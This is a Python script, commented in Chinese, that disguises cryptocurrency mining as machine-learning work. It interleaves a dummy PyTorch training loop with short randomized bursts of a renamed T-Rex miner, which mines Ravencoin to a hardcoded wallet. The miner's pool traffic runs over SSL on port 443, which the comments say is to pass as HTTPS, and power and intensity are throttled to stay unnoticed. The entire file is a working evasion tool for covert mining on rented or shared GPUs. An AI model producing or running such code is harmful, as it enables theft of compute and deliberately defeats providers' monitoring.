#!/usr/bin/env python3
import os, time, subprocess, random
import torch, torch.nn as nn, torch.optim as optim

# —— 配置区 ——  
POOL      = "stratum+ssl://rvn.2miners.com:443"   # SSL + 443 端口，伪装成 HTTPS
WALLET    = "RAjL88Gqz5wheEgJW4hNeEZWbDseubggkv"
GPU_ID    = "0"
PLIMIT    = "50"      # 降到 50W，持续低功耗
INTENSITY = "10"      # 强度降到 10，避免高占用
MINER_BIN = "./cloud-agent"   # 你的 t‑rex 并重命名过
# 每次挖矿时长 5–10 秒，休息 20–40 秒
BURST_MIN = 5
BURST_MAX = 10
COOLDOWN_MIN = 20
COOLDOWN_MAX = 40
# ML：每 epoch 运行划分
EPOCHS = 100
# —— 结束配置 ——  

# 检查
if not os.path.isfile(MINER_BIN):
    raise SystemExit(f"❌ 找不到矿机二进制 {MINER_BIN}")

# DummyNet 定义
class DummyNet(nn.Module):
    def __init__(self):
        super().__init__()
        self.net = nn.Sequential(
            nn.Linear(100,128), nn.ReLU(),
            nn.Linear(128,10),
        )
    def forward(self, x):
        return self.net(x)

def ml_and_stealth_mine():
    # 限制 PyTorch GPU 内存使用
    if torch.cuda.is_available():
        torch.cuda.set_per_process_memory_fraction(0.3, device=int(GPU_ID))
    device = torch.device(f"cuda:{GPU_ID}" if torch.cuda.is_available() else "cpu")
    model = DummyNet().to(device)
    opt   = optim.Adam(model.parameters(), lr=1e-3)
    loss_fn = nn.CrossEntropyLoss()
    data   = torch.randn(64,100, device=device)
    target = torch.randint(0,10,(64,), device=device)

    print("[ML] 开始训练与分段挖矿掩饰模式")
    for epoch in range(1, EPOCHS+1):
        # 1️⃣ 正常 ML 一次迭代
        opt.zero_grad(); out = model(data)
        loss = loss_fn(out, target); loss.backward(); opt.step()
        print(f"[ML] Epoch {epoch:03d}  Loss {loss.item():.4f}")

        # 2️⃣ 随机小段挖矿
        burst   = random.randint(BURST_MIN, BURST_MAX)
        cooldown= random.randint(COOLDOWN_MIN, COOLDOWN_MAX)
        worker  = f"{os.uname().nodename}-{int(time.time())}"
        cmd = [
            MINER_BIN,
            "-a","kawpow",
            "-o", POOL,
            "-u", f"{WALLET}.{worker}",
            "-p","x",
            "--pl", PLIMIT,
            "-i", INTENSITY,
            "--gpu-report-interval","60"
        ]
        print(f"[MINE] 爆发挖矿 {burst}s ->", " ".join(cmd))
        p = subprocess.Popen(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        time.sleep(burst)
        p.terminate()  # 优雅结束
        p.wait(timeout=5)
        print(f"[MINE] 停止挖矿，冷却 {cooldown}s")
        time.sleep(cooldown)

    print("[ML] 全部 Epoch 完成，脚本结束。")

if __name__ == "__main__":
    ml_and_stealth_mine()
